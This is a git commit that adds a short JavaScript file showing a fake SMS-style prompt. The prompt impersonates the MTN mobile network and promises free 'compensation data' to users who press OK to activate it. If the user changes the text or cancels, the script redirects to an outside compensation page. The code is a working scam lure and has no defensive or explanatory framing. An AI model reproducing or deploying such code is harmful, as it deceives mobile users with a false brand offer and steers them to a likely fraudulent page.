c11ad504445e84ef76a4425ddcfc21e12076da07
mfednewblog8 <nsikakimoh68@gmail.com>
2026-04-19 07:57:06 +0100

    Create compensation-activation.js

---
+++ compensation-activation.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE NOW'
+password=prompt('SMS: Because many MTN users complained that their data finishes too fast, we have a compensation data for you, press OK to activate ','ACTIVATE NOW');
+if (password != 'ACTIVATE NOW') {
+location.href='https://ibaidad.com/compensation.html';
+}
